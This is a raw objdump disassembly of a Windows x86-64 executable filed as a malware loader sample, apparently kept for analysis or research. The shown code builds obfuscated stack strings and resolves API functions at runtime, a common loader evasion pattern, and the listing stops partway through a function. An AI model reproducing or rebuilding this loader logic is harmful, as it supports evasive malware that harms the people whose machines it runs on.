
malware_samples/loader/668f932433a24bbae89d60b24eee4a24808fc741f62c5a3043bb7c9152342f40.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 8d 05 e1 a7 3a 00 	lea    0x3aa7e1(%rip),%rax        # 0x1803ab7e8
   180001007:	c3                   	ret
   180001008:	cc                   	int3
   180001009:	cc                   	int3
   18000100a:	cc                   	int3
   18000100b:	cc                   	int3
   18000100c:	cc                   	int3
   18000100d:	cc                   	int3
   18000100e:	cc                   	int3
   18000100f:	cc                   	int3
   180001010:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   180001015:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000101a:	53                   	push   %rbx
   18000101b:	55                   	push   %rbp
   18000101c:	56                   	push   %rsi
   18000101d:	57                   	push   %rdi
   18000101e:	48 83 ec 38          	sub    $0x38,%rsp
   180001022:	49 8b f0             	mov    %r8,%rsi
   180001025:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   18000102a:	48 8b fa             	mov    %rdx,%rdi
   18000102d:	48 8b d9             	mov    %rcx,%rbx
   180001030:	e8 cb ff ff ff       	call   0x180001000
   180001035:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   18000103a:	4c 8b ce             	mov    %rsi,%r9
   18000103d:	4c 8b c7             	mov    %rdi,%r8
   180001040:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180001047:	00 00 
   180001049:	48 8b d3             	mov    %rbx,%rdx
   18000104c:	48 8b 08             	mov    (%rax),%rcx
   18000104f:	48 83 c9 02          	or     $0x2,%rcx
   180001053:	e8 94 63 01 00       	call   0x1800173ec
   180001058:	85 c0                	test   %eax,%eax
   18000105a:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   18000105f:	0f 48 c1             	cmovs  %ecx,%eax
   180001062:	48 83 c4 38          	add    $0x38,%rsp
   180001066:	5f                   	pop    %rdi
   180001067:	5e                   	pop    %rsi
   180001068:	5d                   	pop    %rbp
   180001069:	5b                   	pop    %rbx
   18000106a:	c3                   	ret
   18000106b:	cc                   	int3
   18000106c:	cc                   	int3
   18000106d:	cc                   	int3
   18000106e:	cc                   	int3
   18000106f:	cc                   	int3
   180001070:	40 53                	rex push %rbx
   180001072:	48 83 ec 20          	sub    $0x20,%rsp
   180001076:	48 8b d9             	mov    %rcx,%rbx
   180001079:	48 8b c2             	mov    %rdx,%rax
   18000107c:	48 8d 0d 95 53 02 00 	lea    0x25395(%rip),%rcx        # 0x180026418
   180001083:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001086:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000108a:	48 89 0b             	mov    %rcx,(%rbx)
   18000108d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001091:	0f 11 02             	movups %xmm0,(%rdx)
   180001094:	e8 67 f7 00 00       	call   0x180010800
   180001099:	48 8b c3             	mov    %rbx,%rax
   18000109c:	48 83 c4 20          	add    $0x20,%rsp
   1800010a0:	5b                   	pop    %rbx
   1800010a1:	c3                   	ret
   1800010a2:	cc                   	int3
   1800010a3:	cc                   	int3
   1800010a4:	cc                   	int3
   1800010a5:	cc                   	int3
   1800010a6:	cc                   	int3
   1800010a7:	cc                   	int3
   1800010a8:	cc                   	int3
   1800010a9:	cc                   	int3
   1800010aa:	cc                   	int3
   1800010ab:	cc                   	int3
   1800010ac:	cc                   	int3
   1800010ad:	cc                   	int3
   1800010ae:	cc                   	int3
   1800010af:	cc                   	int3
   1800010b0:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1800010b4:	48 8d 05 4d d9 02 00 	lea    0x2d94d(%rip),%rax        # 0x18002ea08
   1800010bb:	48 85 d2             	test   %rdx,%rdx
   1800010be:	48 0f 45 c2          	cmovne %rdx,%rax
   1800010c2:	c3                   	ret
   1800010c3:	cc                   	int3
   1800010c4:	cc                   	int3
   1800010c5:	cc                   	int3
   1800010c6:	cc                   	int3
   1800010c7:	cc                   	int3
   1800010c8:	cc                   	int3
   1800010c9:	cc                   	int3
   1800010ca:	cc                   	int3
   1800010cb:	cc                   	int3
   1800010cc:	cc                   	int3
   1800010cd:	cc                   	int3
   1800010ce:	cc                   	int3
   1800010cf:	cc                   	int3
   1800010d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800010d5:	57                   	push   %rdi
   1800010d6:	48 83 ec 20          	sub    $0x20,%rsp
   1800010da:	48 8d 05 37 53 02 00 	lea    0x25337(%rip),%rax        # 0x180026418
   1800010e1:	48 8b f9             	mov    %rcx,%rdi
   1800010e4:	48 89 01             	mov    %rax,(%rcx)
   1800010e7:	8b da                	mov    %edx,%ebx
   1800010e9:	48 83 c1 08          	add    $0x8,%rcx
   1800010ed:	e8 8e f7 00 00       	call   0x180010880
   1800010f2:	f6 c3 01             	test   $0x1,%bl
   1800010f5:	74 0d                	je     0x180001104
   1800010f7:	ba 18 00 00 00       	mov    $0x18,%edx
   1800010fc:	48 8b cf             	mov    %rdi,%rcx
   1800010ff:	e8 a8 dd 00 00       	call   0x18000eeac
   180001104:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001109:	48 8b c7             	mov    %rdi,%rax
   18000110c:	48 83 c4 20          	add    $0x20,%rsp
   180001110:	5f                   	pop    %rdi
   180001111:	c3                   	ret
   180001112:	cc                   	int3
   180001113:	cc                   	int3
   180001114:	cc                   	int3
   180001115:	cc                   	int3
   180001116:	cc                   	int3
   180001117:	cc                   	int3
   180001118:	cc                   	int3
   180001119:	cc                   	int3
   18000111a:	cc                   	int3
   18000111b:	cc                   	int3
   18000111c:	cc                   	int3
   18000111d:	cc                   	int3
   18000111e:	cc                   	int3
   18000111f:	cc                   	int3
   180001120:	48 8d 05 f1 52 02 00 	lea    0x252f1(%rip),%rax        # 0x180026418
   180001127:	48 89 01             	mov    %rax,(%rcx)
   18000112a:	48 83 c1 08          	add    $0x8,%rcx
   18000112e:	e9 4d f7 00 00       	jmp    0x180010880
   180001133:	cc                   	int3
   180001134:	cc                   	int3
   180001135:	cc                   	int3
   180001136:	cc                   	int3
   180001137:	cc                   	int3
   180001138:	cc                   	int3
   180001139:	cc                   	int3
   18000113a:	cc                   	int3
   18000113b:	cc                   	int3
   18000113c:	cc                   	int3
   18000113d:	cc                   	int3
   18000113e:	cc                   	int3
   18000113f:	cc                   	int3
   180001140:	48 8d 05 d9 d8 02 00 	lea    0x2d8d9(%rip),%rax        # 0x18002ea20
   180001147:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   18000114e:	00 
   18000114f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180001153:	48 8d 05 56 53 02 00 	lea    0x25356(%rip),%rax        # 0x1800264b0
   18000115a:	48 89 01             	mov    %rax,(%rcx)
   18000115d:	48 8b c1             	mov    %rcx,%rax
   180001160:	c3                   	ret
   180001161:	cc                   	int3
   180001162:	cc                   	int3
   180001163:	cc                   	int3
   180001164:	cc                   	int3
   180001165:	cc                   	int3
   180001166:	cc                   	int3
   180001167:	cc                   	int3
   180001168:	cc                   	int3
   180001169:	cc                   	int3
   18000116a:	cc                   	int3
   18000116b:	cc                   	int3
   18000116c:	cc                   	int3
   18000116d:	cc                   	int3
   18000116e:	cc                   	int3
   18000116f:	cc                   	int3
   180001170:	48 83 ec 48          	sub    $0x48,%rsp
   180001174:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001179:	e8 c2 ff ff ff       	call   0x180001140
   18000117e:	48 8d 15 3b 6b 3a 00 	lea    0x3a6b3b(%rip),%rdx        # 0x1803a7cc0
   180001185:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000118a:	e8 11 fd 00 00       	call   0x180010ea0
   18000118f:	cc                   	int3
   180001190:	40 53                	rex push %rbx
   180001192:	48 83 ec 20          	sub    $0x20,%rsp
   180001196:	48 8b d9             	mov    %rcx,%rbx
   180001199:	48 8b c2             	mov    %rdx,%rax
   18000119c:	48 8d 0d 75 52 02 00 	lea    0x25275(%rip),%rcx        # 0x180026418
   1800011a3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800011a6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1800011aa:	48 89 0b             	mov    %rcx,(%rbx)
   1800011ad:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800011b1:	0f 11 02             	movups %xmm0,(%rdx)
   1800011b4:	e8 47 f6 00 00       	call   0x180010800
   1800011b9:	48 8d 05 f0 52 02 00 	lea    0x252f0(%rip),%rax        # 0x1800264b0
   1800011c0:	48 89 03             	mov    %rax,(%rbx)
   1800011c3:	48 8b c3             	mov    %rbx,%rax
   1800011c6:	48 83 c4 20          	add    $0x20,%rsp
   1800011ca:	5b                   	pop    %rbx
   1800011cb:	c3                   	ret
   1800011cc:	cc                   	int3
   1800011cd:	cc                   	int3
   1800011ce:	cc                   	int3
   1800011cf:	cc                   	int3
   1800011d0:	40 53                	rex push %rbx
   1800011d2:	48 83 ec 20          	sub    $0x20,%rsp
   1800011d6:	48 8b d9             	mov    %rcx,%rbx
   1800011d9:	48 8b c2             	mov    %rdx,%rax
   1800011dc:	48 8d 0d 35 52 02 00 	lea    0x25235(%rip),%rcx        # 0x180026418
   1800011e3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800011e6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1800011ea:	48 89 0b             	mov    %rcx,(%rbx)
   1800011ed:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800011f1:	0f 11 02             	movups %xmm0,(%rdx)
   1800011f4:	e8 07 f6 00 00       	call   0x180010800
   1800011f9:	48 8d 05 30 52 02 00 	lea    0x25230(%rip),%rax        # 0x180026430
   180001200:	48 89 03             	mov    %rax,(%rbx)
   180001203:	48 8b c3             	mov    %rbx,%rax
   180001206:	48 83 c4 20          	add    $0x20,%rsp
   18000120a:	5b                   	pop    %rbx
   18000120b:	c3                   	ret
   18000120c:	cc                   	int3
   18000120d:	cc                   	int3
   18000120e:	cc                   	int3
   18000120f:	cc                   	int3
   180001210:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001215:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000121a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   18000121f:	55                   	push   %rbp
   180001220:	41 54                	push   %r12
   180001222:	41 55                	push   %r13
   180001224:	41 56                	push   %r14
   180001226:	41 57                	push   %r15
   180001228:	48 8d ac 24 60 fd ff 	lea    -0x2a0(%rsp),%rbp
   18000122f:	ff 
   180001230:	48 81 ec a0 03 00 00 	sub    $0x3a0,%rsp
   180001237:	48 8b 05 c2 7d 3a 00 	mov    0x3a7dc2(%rip),%rax        # 0x1803a9000
   18000123e:	48 33 c4             	xor    %rsp,%rax
   180001241:	48 89 85 98 02 00 00 	mov    %rax,0x298(%rbp)
   180001248:	33 c0                	xor    %eax,%eax
   18000124a:	c7 85 d8 01 00 00 41 	movl   $0x470041,0x1d8(%rbp)
   180001251:	00 47 00 
   180001254:	33 f6                	xor    %esi,%esi
   180001256:	66 89 85 8e 00 00 00 	mov    %ax,0x8e(%rbp)
   18000125d:	41 ba 2d 00 00 00    	mov    $0x2d,%r10d
   180001263:	89 75 ec             	mov    %esi,-0x14(%rbp)
   180001266:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001269:	89 75 ec             	mov    %esi,-0x14(%rbp)
   18000126c:	48 8d 8d d8 01 00 00 	lea    0x1d8(%rbp),%rcx
   180001273:	89 85 fe 01 00 00    	mov    %eax,0x1fe(%rbp)
   180001279:	44 8b fe             	mov    %esi,%r15d
   18000127c:	66 89 85 02 02 00 00 	mov    %ax,0x202(%rbp)
   180001283:	41 bd 07 00 00 00    	mov    $0x7,%r13d
   180001289:	c7 85 dc 01 00 00 57 	movl   $0x5f0057,0x1dc(%rbp)
   180001290:	00 5f 00 
   180001293:	0f 11 85 ee 01 00 00 	movups %xmm0,0x1ee(%rbp)
   18000129a:	c7 85 e0 01 00 00 57 	movl   $0x5c0057,0x1e0(%rbp)
   1800012a1:	00 5c 00 
   1800012a4:	c7 85 e4 01 00 00 07 	movl   $0x4e0007,0x1e4(%rbp)
   1800012ab:	00 4e 00 
   1800012ae:	c7 85 e8 01 00 00 47 	movl   $0x400047,0x1e8(%rbp)
   1800012b5:	00 40 00 
   1800012b8:	66 44 89 95 ec 01 00 	mov    %r10w,0x1ec(%rbp)
   1800012bf:	00 
   1800012c0:	e8 1b d4 00 00       	call   0x18000e6e0
   1800012c5:	48 8b c8             	mov    %rax,%rcx
   1800012c8:	ff 15 42 4e 02 00    	call   *0x24e42(%rip)        # 0x180026110
   1800012ce:	48 8b f8             	mov    %rax,%rdi
   1800012d1:	48 85 c0             	test   %rax,%rax
   1800012d4:	0f 84 0a 20 00 00    	je     0x1800032e4
   1800012da:	66 0f 6f 15 fe 38 3a 	movdqa 0x3a38fe(%rip),%xmm2        # 0x1803a4be0
   1800012e1:	00 
   1800012e2:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   1800012e6:	66 0f 6f 0d a2 3d 3a 	movdqa 0x3a3da2(%rip),%xmm1        # 0x1803a5090
   1800012ed:	00 
   1800012ee:	33 c0                	xor    %eax,%eax
   1800012f0:	f2 0f 11 55 50       	movsd  %xmm2,0x50(%rbp)
   1800012f5:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800012f8:	66 0f 73 da 08       	psrldq $0x8,%xmm2
   1800012fd:	66 0f 7e 55 58       	movd   %xmm2,0x58(%rbp)
   180001302:	0f 11 45 5c          	movups %xmm0,0x5c(%rbp)
   180001306:	48 89 45 6c          	mov    %rax,0x6c(%rbp)
   18000130a:	89 45 74             	mov    %eax,0x74(%rbp)
   18000130d:	0f 11 4d 40          	movups %xmm1,0x40(%rbp)
   180001311:	e8 7a d3 00 00       	call   0x18000e690
   180001316:	48 8b d0             	mov    %rax,%rdx
   180001319:	48 8b cf             	mov    %rdi,%rcx
   18000131c:	ff 15 0e 4e 02 00    	call   *0x24e0e(%rip)        # 0x180026130
   180001322:	48 89 05 47 99 3a 00 	mov    %rax,0x3a9947(%rip)        # 0x1803aac70
   180001329:	bb 01 00 00 00       	mov    $0x1,%ebx
   18000132e:	48 85 c0             	test   %rax,%rax
   180001331:	0f 84 e9 02 00 00    	je     0x180001620
   180001337:	66 0f 6f 0d f1 3b 3a 	movdqa 0x3a3bf1(%rip),%xmm1        # 0x1803a4f30
   18000133e:	00 
   18000133f:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   180001343:	33 c0                	xor    %eax,%eax
   180001345:	66 c7 44 24 50 4a 34 	movw   $0x344a,0x50(%rsp)
   18000134c:	89 44 24 52          	mov    %eax,0x52(%rsp)
   180001350:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001353:	66 89 44 24 56       	mov    %ax,0x56(%rsp)
   180001358:	66 89 45 3a          	mov    %ax,0x3a(%rbp)
   18000135c:	0f b7 44 24 50       	movzwl 0x50(%rsp),%eax
   180001361:	66 89 45 28          	mov    %ax,0x28(%rbp)
   180001365:	0f 11 45 2a          	movups %xmm0,0x2a(%rbp)
   180001369:	0f 11 4d 18          	movups %xmm1,0x18(%rbp)
   18000136d:	e8 ce d2 00 00       	call   0x18000e640
   180001372:	48 8b d0             	mov    %rax,%rdx
   180001375:	48 8b cf             	mov    %rdi,%rcx
   180001378:	ff 15 b2 4d 02 00    	call   *0x24db2(%rip)        # 0x180026130
   18000137e:	48 89 05 93 99 3a 00 	mov    %rax,0x3a9993(%rip)        # 0x1803aad18
   180001385:	bb 03 00 00 00       	mov    $0x3,%ebx
   18000138a:	48 85 c0             	test   %rax,%rax
   18000138d:	0f 84 8d 02 00 00    	je     0x180001620
   180001393:	66 0f 6f 15 d5 37 3a 	movdqa 0x3a37d5(%rip),%xmm2        # 0x1803a4b70
   18000139a:	00 
   18000139b:	48 8d 8d c0 00 00 00 	lea    0xc0(%rbp),%rcx
   1800013a2:	66 0f 6f 0d 06 3c 3a 	movdqa 0x3a3c06(%rip),%xmm1        # 0x1803a4fb0
   1800013a9:	00 
   1800013aa:	33 c0                	xor    %eax,%eax
   1800013ac:	48 89 85 eb 00 00 00 	mov    %rax,0xeb(%rbp)
   1800013b3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800013b6:	66 89 85 f3 00 00 00 	mov    %ax,0xf3(%rbp)
   1800013bd:	88 85 f5 00 00 00    	mov    %al,0xf5(%rbp)
   1800013c3:	66 0f c5 c2 04       	pextrw $0x4,%xmm2,%eax
   1800013c8:	f2 0f 11 95 d0 00 00 	movsd  %xmm2,0xd0(%rbp)
   1800013cf:	00 
   1800013d0:	66 0f 73 da 0a       	psrldq $0xa,%xmm2
   1800013d5:	0f 11 85 db 00 00 00 	movups %xmm0,0xdb(%rbp)
   1800013dc:	66 89 85 d8 00 00 00 	mov    %ax,0xd8(%rbp)
   1800013e3:	66 0f 7e d0          	movd   %xmm2,%eax
   1800013e7:	0f 11 8d c0 00 00 00 	movups %xmm1,0xc0(%rbp)
   1800013ee:	88 85 da 00 00 00    	mov    %al,0xda(%rbp)
   1800013f4:	e8 17 d2 00 00       	call   0x18000e610
   1800013f9:	48 8b d0             	mov    %rax,%rdx
   1800013fc:	48 8b cf             	mov    %rdi,%rcx
   1800013ff:	ff 15 2b 4d 02 00    	call   *0x24d2b(%rip)        # 0x180026130
   180001405:	48 89 05 6c 98 3a 00 	mov    %rax,0x3a986c(%rip)        # 0x1803aac78
   18000140c:	41 8b dd             	mov    %r13d,%ebx
   18000140f:	48 85 c0             	test   %rax,%rax
   180001412:	0f 84 08 02 00 00    	je     0x180001620
   180001418:	66 0f 6f 0d f0 38 3a 	movdqa 0x3a38f0(%rip),%xmm1        # 0x1803a4d10
   18000141f:	00 
   180001420:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001425:	33 c0                	xor    %eax,%eax
   180001427:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000142b:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   180001430:	48 89 44 24 2e       	mov    %rax,0x2e(%rsp)
   180001435:	89 44 24 36          	mov    %eax,0x36(%rsp)
   180001439:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   18000143e:	66 0f 7e c8          	movd   %xmm1,%eax
   180001442:	88 44 24 20          	mov    %al,0x20(%rsp)
   180001446:	66 0f 7e c0          	movd   %xmm0,%eax
   18000144a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000144e:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   180001453:	88 44 24 21          	mov    %al,0x21(%rsp)
   180001457:	66 0f 7e c0          	movd   %xmm0,%eax
   18000145b:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000145f:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   180001464:	88 44 24 22          	mov    %al,0x22(%rsp)
   180001468:	66 0f 7e c0          	movd   %xmm0,%eax
   18000146c:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001470:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   180001475:	88 44 24 23          	mov    %al,0x23(%rsp)
   180001479:	66 0f 7e c0          	movd   %xmm0,%eax
   18000147d:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001481:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   180001486:	88 44 24 24          	mov    %al,0x24(%rsp)
   18000148a:	66 0f 7e c0          	movd   %xmm0,%eax
   18000148e:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001492:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   180001497:	88 44 24 25          	mov    %al,0x25(%rsp)
   18000149b:	66 0f 7e c0          	movd   %xmm0,%eax
   18000149f:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800014a3:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   1800014a8:	88 44 24 26          	mov    %al,0x26(%rsp)
   1800014ac:	66 0f 7e c0          	movd   %xmm0,%eax
   1800014b0:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800014b4:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   1800014b9:	88 44 24 27          	mov    %al,0x27(%rsp)
   1800014bd:	66 0f 7e c0          	movd   %xmm0,%eax
   1800014c1:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800014c5:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   1800014ca:	88 44 24 28          	mov    %al,0x28(%rsp)
   1800014ce:	66 0f 7e c0          	movd   %xmm0,%eax
   1800014d2:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800014d6:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   1800014db:	88 44 24 29          	mov    %al,0x29(%rsp)
   1800014df:	66 0f 7e c0          	movd   %xmm0,%eax
   1800014e3:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800014e7:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   1800014ec:	88 44 24 2a          	mov    %al,0x2a(%rsp)
   1800014f0:	66 0f 7e c0          	movd   %xmm0,%eax
   1800014f4:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800014f8:	66 0f 73 d8 0c       	psrldq $0xc,%xmm0
   1800014fd:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   180001502:	88 44 24 2b          	mov    %al,0x2b(%rsp)
   180001506:	66 0f 7e c0          	movd   %xmm0,%eax
   18000150a:	88 44 24 2c          	mov    %al,0x2c(%rsp)
   18000150e:	66 0f 7e c8          	movd   %xmm1,%eax
   180001512:	88 44 24 2d          	mov    %al,0x2d(%rsp)
   180001516:	e8 a5 d0 00 00       	call   0x18000e5c0
   18000151b:	48 8b d0             	mov    %rax,%rdx
   18000151e:	48 8b cf             	mov    %rdi,%rcx
   180001521:	ff 15 09 4c 02 00    	call   *0x24c09(%rip)        # 0x180026130
   180001527:	48 89 05 3a 97 3a 00 	mov    %rax,0x3a973a(%rip)        # 0x1803aac68
   18000152e:	bb 0f 00 00 00       	mov    $0xf,%ebx
   180001533:	48 85 c0             	test   %rax,%rax
   180001536:	0f 84 e4 00 00 00    	je     0x180001620
   18000153c:	66 0f 6f 0d 4c 3a 3a 	movdqa 0x3a3a4c(%rip),%xmm1        # 0x1803a4f90
   180001543:	00 
   180001544:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180001548:	33 c0                	xor    %eax,%eax
   18000154a:	c6 45 00 33          	movb   $0x33,0x0(%rbp)
   18000154e:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001551:	89 85 89 00 00 00    	mov    %eax,0x89(%rbp)
   180001557:	66 89 85 8d 00 00 00 	mov    %ax,0x8d(%rbp)
   18000155e:	88 85 8f 00 00 00    	mov    %al,0x8f(%rbp)
   180001564:	0f 11 45 01          	movups %xmm0,0x1(%rbp)
   180001568:	88 45 11             	mov    %al,0x11(%rbp)
   18000156b:	0f 11 4d f0          	movups %xmm1,-0x10(%rbp)
   18000156f:	e8 1c d0 00 00       	call   0x18000e590
   180001574:	48 8b d0             	mov    %rax,%rdx
   180001577:	48 8b cf             	mov    %rdi,%rcx
   18000157a:	ff 15 b0 4b 02 00    	call   *0x24bb0(%rip)        # 0x180026130
   180001580:	48 89 05 51 97 3a 00 	mov    %rax,0x3a9751(%rip)        # 0x1803aacd8
   180001587:	bb 1f 00 00 00       	mov    $0x1f,%ebx
   18000158c:	48 85 c0             	test   %rax,%rax
   18000158f:	0f 84 8b 00 00 00    	je     0x180001620
   180001595:	66 0f 6f 15 f3 36 3a 	movdqa 0x3a36f3(%rip),%xmm2        # 0x1803a4c90
   18000159c:	00 
   18000159d:	48 8d 8d 28 01 00 00 	lea    0x128(%rbp),%rcx
   1800015a4:	66 0f 6f 0d e4 38 3a 	movdqa 0x3a38e4(%rip),%xmm1        # 0x1803a4e90
   1800015ab:	00 
   1800015ac:	33 c0                	xor    %eax,%eax
   1800015ae:	0f 11 8d 28 01 00 00 	movups %xmm1,0x128(%rbp)
   1800015b5:	48 89 85 55 01 00 00 	mov    %rax,0x155(%rbp)
   1800015bc:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   1800015c0:	f2 0f 11 95 38 01 00 	movsd  %xmm2,0x138(%rbp)
   1800015c7:	00 
   1800015c8:	89 85 5d 01 00 00    	mov    %eax,0x15d(%rbp)
   1800015ce:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800015d1:	88 85 61 01 00 00    	mov    %al,0x161(%rbp)
   1800015d7:	66 0f 73 da 0c       	psrldq $0xc,%xmm2
   1800015dc:	66 0f 7e d0          	movd   %xmm2,%eax
   1800015e0:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   1800015e5:	0f 11 85 45 01 00 00 	movups %xmm0,0x145(%rbp)
   1800015ec:	88 85 44 01 00 00    	mov    %al,0x144(%rbp)
   1800015f2:	66 0f 7e 8d 40 01 00 	movd   %xmm1,0x140(%rbp)
   1800015f9:	00 
   1800015fa:	e8 61 cf 00 00       	call   0x18000e560
   1800015ff:	48 8b d0             	mov    %rax,%rdx
   180001602:	48 8b cf             	mov    %rdi,%rcx
   180001605:	ff 15 25 4b 02 00    	call   *0x24b25(%rip)        # 0x180026130
   18000160b:	48 89 05 2e 96 3a 00 	mov    %rax,0x3a962e(%rip)        # 0x1803aac40
   180001612:	bb 3f 00 00 00       	mov    $0x3f,%ebx
   180001617:	48 85 c0             	test   %rax,%rax
   18000161a:	74 04                	je     0x180001620
   18000161c:	32 c9                	xor    %cl,%cl
   18000161e:	eb 07                	jmp    0x180001627
   180001620:	b1 01                	mov    $0x1,%cl
   180001622:	f6 c3 20             	test   $0x20,%bl
   180001625:	74 1a                	je     0x180001641
   180001627:	83 e3 df             	and    $0xffffffdf,%ebx
   18000162a:	48 8b c6             	mov    %rsi,%rax
   18000162d:	0f 1f 00             	nopl   (%rax)
   180001630:	40 88 b4 05 45 01 00 	mov    %sil,0x145(%rbp,%rax,1)
   180001637:	00 
   180001638:	48 ff c0             	inc    %rax
   18000163b:	48 83 f8 1d          	cmp    $0x1d,%rax
   18000163f:	72 ef                	jb     0x180001630
   180001641:	f6 c3 10             	test   $0x10,%bl
   180001644:	74 18                	je     0x18000165e
   180001646:	83 e3 ef             	and    $0xffffffef,%ebx
   180001649:	48 8b c6             	mov    %rsi,%rax
   18000164c:	0f 1f 40 00          	nopl   0x0(%rax)
   180001650:	40 88 74 05 01       	mov    %sil,0x1(%rbp,%rax,1)
   180001655:	48 ff c0             	inc    %rax
   180001658:	48 83 f8 11          	cmp    $0x11,%rax
   18000165c:	72 f2                	jb     0x180001650
   18000165e:	f6 c3 08             	test   $0x8,%bl
   180001661:	74 1b                	je     0x18000167e
   180001663:	83 e3 f7             	and    $0xfffffff7,%ebx
   180001666:	48 8b c6             	mov    %rsi,%rax
   180001669:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001670:	40 88 74 04 2e       	mov    %sil,0x2e(%rsp,%rax,1)
   180001675:	48 ff c0             	inc    %rax
   180001678:	48 83 f8 0e          	cmp    $0xe,%rax
   18000167c:	72 f2                	jb     0x180001670
   18000167e:	f6 c3 04             	test   $0x4,%bl
   180001681:	74 1e                	je     0x1800016a1
   180001683:	83 e3 fb             	and    $0xfffffffb,%ebx
   180001686:	48 8b c6             	mov    %rsi,%rax
   180001689:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001690:	40 88 b4 05 db 00 00 	mov    %sil,0xdb(%rbp,%rax,1)
   180001697:	00 
   180001698:	48 ff c0             	inc    %rax
   18000169b:	48 83 f8 1b          	cmp    $0x1b,%rax
   18000169f:	72 ef                	jb     0x180001690
   1800016a1:	f6 c3 02             	test   $0x2,%bl
   1800016a4:	74 18                	je     0x1800016be
   1800016a6:	83 e3 fd             	and    $0xfffffffd,%ebx
   1800016a9:	48 8b c6             	mov    %rsi,%rax
   1800016ac:	0f 1f 40 00          	nopl   0x0(%rax)
   1800016b0:	40 88 74 05 2a       	mov    %sil,0x2a(%rbp,%rax,1)
   1800016b5:	48 ff c0             	inc    %rax
   1800016b8:	48 83 f8 12          	cmp    $0x12,%rax
   1800016bc:	72 f2                	jb     0x1800016b0
   1800016be:	83 e3 fe             	and    $0xfffffffe,%ebx
   1800016c1:	48 8b c6             	mov    %rsi,%rax
   1800016c4:	0f 1f 40 00          	nopl   0x0(%rax)
   1800016c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1800016cf:	00 
   1800016d0:	40 88 74 05 5c       	mov    %sil,0x5c(%rbp,%rax,1)
   1800016d5:	48 ff c0             	inc    %rax
   1800016d8:	48 83 f8 1c          	cmp    $0x1c,%rax
   1800016dc:	72 f2                	jb     0x1800016d0
   1800016de:	84 c9                	test   %cl,%cl
   1800016e0:	0f 85 fe 1b 00 00    	jne    0x1800032e4
   1800016e6:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800016e9:	c7 44 24 40 4e 00 57 	movl   $0x57004e,0x40(%rsp)
   1800016f0:	00 
   1800016f1:	0f 11 85 80 02 00 00 	movups %xmm0,0x280(%rbp)
   1800016f8:	33 c0                	xor    %eax,%eax
   1800016fa:	c7 44 24 44 46 00 49 	movl   $0x490046,0x44(%rsp)
   180001701:	00 
   180001702:	c7 44 24 48 55 00 4d 	movl   $0x4d0055,0x48(%rsp)
   180001709:	00 
   18000170a:	48 8d 8d 68 02 00 00 	lea    0x268(%rbp),%rcx
   180001711:	c7 44 24 4c 4c 00 04 	movl   $0x4004c,0x4c(%rsp)
   180001718:	00 
   180001719:	0f 10 44 24 40       	movups 0x40(%rsp),%xmm0
   18000171e:	c7 44 24 50 4f 00 40 	movl   $0x40004f,0x50(%rsp)
   180001725:	00 
